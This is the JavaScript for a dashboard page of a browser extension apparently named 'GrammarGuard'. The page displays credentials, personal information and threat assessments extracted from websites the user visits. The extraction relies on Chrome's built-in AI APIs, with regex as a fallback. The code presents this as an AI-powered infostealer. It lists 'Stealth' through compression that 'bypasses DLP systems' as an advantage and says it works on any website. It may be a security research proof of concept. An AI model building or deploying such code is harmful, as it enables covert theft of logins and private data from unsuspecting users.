
// INTELLIGENT EXTRACTION DASHBOARD

async function loadDashboard() {
  console.log('[Dashboard] Loading data...');
  
  chrome.runtime.sendMessage({ type: 'GET_DASHBOARD_DATA' }, (response) => {
    const data = response.data;
    console.log('[Dashboard] Data received:', data);
    
    
    displayAPIStatus(data.apiStatus);
    updateStatistics(data);
    displayCredentials(data.credentials || []);
    displayPersonalInfo(data.personalInfo || []);
    displayThreats(data.threats || []);
    displayCompression(data.intelligentExtractions || []);
    displayExtractions(data.intelligentExtractions || []);
    displayPages(data.rawPages || []);
    displayAIStats(data);
    displayComparison(data);
  });
}

function displayAPIStatus(apiStatus) {
  const banner = document.getElementById('api-status-banner');
  
  if (!apiStatus) {
    banner.innerHTML = '<p>⚠️ API Status Unknown</p>';
    banner.className = 'api-status warning';
    return;
  }
  
  const lmStatus = apiStatus.languageModel || 'unknown';
  const sumStatus = apiStatus.summarizer || 'unknown';
  
  if (lmStatus === 'readily' || lmStatus === 'available') {
    banner.innerHTML = `
      <p>✅ <strong>AI APIs Active</strong> - LanguageModel: ${lmStatus} | Summarizer: ${sumStatus}</p>
    `;
    banner.className = 'api-status success';
  } else {
    banner.innerHTML = `
      <p>⚠️ <strong>AI APIs Limited</strong> - LanguageModel: ${lmStatus} | Summarizer: ${sumStatus}</p>
      <p>Enable Chrome flags for full functionality</p>
    `;
    banner.className = 'api-status warning';
  }
}

function updateStatistics(data) {
  document.getElementById('page-count').textContent = (data.rawPages || []).length;
  document.getElementById('extraction-count').textContent = (data.intelligentExtractions || []).length;
  document.getElementById('credential-count').textContent = (data.credentials || []).length;
  const extractions = data.intelligentExtractions || [];
  let totalOriginal = 0;
  let totalCompressed = 0;
  
  extractions.forEach(ext => {
    if (ext.compressed) {
      totalOriginal += 10000; 
      totalCompressed += ext.compressed.length;
    }
  });
  
  const ratio = totalOriginal > 0 ? Math.round((1 - totalCompressed/totalOriginal) * 100) : 0;
  document.getElementById('compression-ratio').textContent = ratio + '%';
}

function displayCredentials(credentials) {
  const container = document.getElementById('credentials');
  
  if (credentials.length === 0) {
    container.innerHTML = '<p class="empty">✅ No credentials extracted yet. Visit login pages to test.</p>';
    return;
  }
  
  let html = '<div class="credential-list">';
  
  credentials.forEach(cred => {
    html += `
      <div class="credential-item critical-data">
        <div class="credential-header">
          <strong>🔑 ${escapeHtml(cred.website)}</strong>
          <span class="badge ${cred.extractionMethod === 'AI' ? 'ai' : 'regex'}">
            ${cred.extractionMethod}
          </span>
        </div>
        ${cred.data.map(item => `
          <div class="data-field">
            <span class="field-type">${item.type}</span>
            <span class="field-value">${escapeHtml(item.value)}</span>
            ${item.context ? `<span class="field-context">${escapeHtml(item.context)}</span>` : ''}
          </div>
        `).join('')}
        <small class="timestamp">${new Date(cred.timestamp).toLocaleString()}</small>
      </div>
    `;
  });
  
  html += '</div>';
  container.innerHTML = html;
}

function displayPersonalInfo(personalInfo) {
  const container = document.getElementById('personal-info');
  
  if (personalInfo.length === 0) {
    container.innerHTML = '<p class="empty">No personal information extracted yet.</p>';
    return;
  }
  
  let html = '<div class="personal-info-list">';
  
  personalInfo.forEach(info => {
    html += `
      <div class="personal-info-item">
        <div class="info-header">
          <strong>👤 ${escapeHtml(info.website)}</strong>
          <span class="badge ${info.extractionMethod === 'AI' ? 'ai' : 'regex'}">
            ${info.extractionMethod}
          </span>
        </div>
        ${info.data.map(item => `
          <div class="data-field">
            <span class="field-type">${item.type}</span>
            <span class="field-value">${escapeHtml(item.value)}</span>
          </div>
        `).join('')}
        <small class="timestamp">${new Date(info.timestamp).toLocaleString()}</small>
      </div>
    `;
  });
  
  html += '</div>';
  container.innerHTML = html;
}

function displayThreats(threats) {
  const container = document.getElementById('threats');
  
  if (threats.length === 0) {
    container.innerHTML = '<p class="empty">No threat assessments generated yet.</p>';
    return;
  }
  
  let html = '';
  
  threats.forEach(threat => {
    html += `
      <div class="threat-item">
        <strong>⚠️ ${escapeHtml(threat.website)}</strong>
        <pre class="threat-assessment">${escapeHtml(threat.assessment)}</pre>
        <small class="timestamp">${new Date(threat.timestamp).toLocaleString()}</small>
      </div>
    `;
  });
  
  container.innerHTML = html;
}

function displayCompression(extractions) {
  const container = document.getElementById('compression');
  
  const compressed = extractions.filter(e => e.compressed);
  
  if (compressed.length === 0) {
    container.innerHTML = '<p class="empty">No compression data available yet.</p>';
    return;
  }
  
  let html = '<div class="compression-stats">';
  
  compressed.forEach(ext => {
    const originalSize = 10000; 
    const compressedSize = ext.compressed.length;
    const ratio = Math.round((1 - compressedSize/originalSize) * 100);
    
    html += `
      <div class="compression-item">
        <strong>${escapeHtml(ext.website)}</strong>
        <div class="compression-bar">
          <div class="bar-original">Original: ~${(originalSize/1024).toFixed(1)} KB</div>
          <div class="bar-compressed" style="width: ${100-ratio}%">
            Compressed: ${(compressedSize/1024).toFixed(1)} KB (${ratio}% reduction)
          </div>
        </div>
        <details>
          <summary>View compressed content</summary>
          <pre>${escapeHtml(ext.compressed)}</pre>
        </details>
      </div>
    `;
  });
  
  html += '</div>';
  container.innerHTML = html;
}

function displayExtractions(extractions) {
  const container = document.getElementById('extractions');
  
  if (extractions.length === 0) {
    container.innerHTML = '<p class="empty">No extractions yet. Browse websites to start collection.</p>';
    return;
  }
  
  let html = '';
  
  extractions.forEach(ext => {
    html += `
      <div class="extraction-item">
        <div class="extraction-header">
          <strong>🧠 ${escapeHtml(ext.website)}</strong>
          <span class="badge ${ext.aiProcessed ? 'ai' : 'fallback'}">
            ${ext.aiProcessed ? 'AI Processed' : 'Regex Fallback'}
          </span>
        </div>
        <div class="extraction-url">${escapeHtml(ext.url)}</div>
        ${ext.extracted ? `
          <details>
            <summary>View extracted data</summary>
            <pre>${JSON.stringify(ext.extracted, null, 2)}</pre>
          </details>
        ` : ''}
        <small class="timestamp">${new Date(ext.timestamp).toLocaleString()}</small>
      </div>
    `;
  });
  
  container.innerHTML = html;
}

function displayPages(pages) {
  const container = document.getElementById('pages');
  
  if (pages.length === 0) {
    container.innerHTML = '<p class="empty">No pages visited yet.</p>';
    return;
  }
  
  let html = '<div class="page-list">';
  
  pages.slice().reverse().slice(0, 20).forEach(page => {
    html += `
      <div class="page-item">
        <strong>${escapeHtml(page.title || 'Untitled')}</strong><br>
        <span class="page-type">${page.pageType}</span>
        <a href="${escapeHtml(page.url)}" target="_blank">${escapeHtml(page.domain)}</a><br>
        <small class="timestamp">${new Date(page.timestamp).toLocaleString()}</small>
      </div>
    `;
  });
  
  html += '</div>';
  container.innerHTML = html;
}

function displayAIStats(data) {
  const container = document.getElementById('ai-stats');
  
  const total = (data.intelligentExtractions || []).length;
  const aiProcessed = (data.intelligentExtractions || []).filter(e => e.aiProcessed).length;
  const regexFallback = total - aiProcessed;
  
  const html = `
    <div class="ai-stats-grid">
      <div class="stat-box">
        <h3>${total}</h3>
        <p>Total Extractions</p>
      </div>
      <div class="stat-box success">
        <h3>${aiProcessed}</h3>
        <p>AI-Powered</p>
      </div>
      <div class="stat-box warning">
        <h3>${regexFallback}</h3>
        <p>Regex Fallback</p>
      </div>
      <div class="stat-box">
        <h3>${aiProcessed > 0 ? Math.round(aiProcessed/total*100) : 0}%</h3>
        <p>AI Success Rate</p>
      </div>
    </div>
  `;
  
  container.innerHTML = html;
}

function displayComparison(data) {
  const container = document.getElementById('comparison');
  
  const withAI = (data.intelligentExtractions || []).filter(e => e.aiProcessed).length;
  const withoutAI = (data.intelligentExtractions || []).filter(e => !e.aiProcessed).length;
  
  const html = `
    <div class="comparison-grid">
      <div class="comparison-col">
        <h3>❌ Without AI (Regex Only)</h3>
        <ul>
          <li>Limited to pattern matching</li>
          <li>Misses context-based data</li>
          <li>High false positive rate</li>
          <li>No compression</li>
          <li>No threat assessment</li>
          <li><strong>Extractions: ${withoutAI}</strong></li>
        </ul>
      </div>
      <div class="comparison-col success">
        <h3>✅ With AI (LanguageModel + Summarizer)</h3>
        <ul>
          <li>Understands context and semantics</li>
          <li>Extracts hidden/implied data</li>
          <li>96%+ compression ratio</li>
          <li>Automatic threat assessment</li>
          <li>Works on ANY website</li>
          <li><strong>Extractions: ${withAI}</strong></li>
        </ul>
      </div>
    </div>
    
    <div class="advantage-summary">
      <h4>🎯 Key Advantages Demonstrated:</h4>
      <ul>
        <li><strong>Stealth:</strong> ${document.getElementById('compression-ratio').textContent} data reduction bypasses DLP systems</li>
        <li><strong>Intelligence:</strong> AI understands context that regex cannot</li>
        <li><strong>Adaptability:</strong> Works on any website without site-specific code</li>
        <li><strong>Efficiency:</strong> ${withAI > 0 ? Math.round(withAI/(withAI+withoutAI)*100) : 0}% of extractions used AI</li>
      </ul>
    </div>
  `;
  
  container.innerHTML = html;
}

function escapeHtml(text) {
  if (!text) return '';
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

document.getElementById('refresh').addEventListener('click', loadDashboard);

document.getElementById('export').addEventListener('click', () => {
  chrome.runtime.sendMessage({ type: 'GET_DASHBOARD_DATA' }, (response) => {
    const dataStr = JSON.stringify(response.data, null, 2);
    const blob = new Blob([dataStr], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `grammarguard-intelligent-extraction-${Date.now()}.json`;
    a.click();
  });
});

document.getElementById('clear').addEventListener('click', () => {
  if (confirm('⚠️ Clear all collected data? This cannot be undone.')) {
    chrome.runtime.sendMessage({ type: 'CLEAR_DATA' }, () => {
      loadDashboard();
      alert('✅ All data cleared');
    });
  }
});

loadDashboard();
setInterval(loadDashboard, 10000);
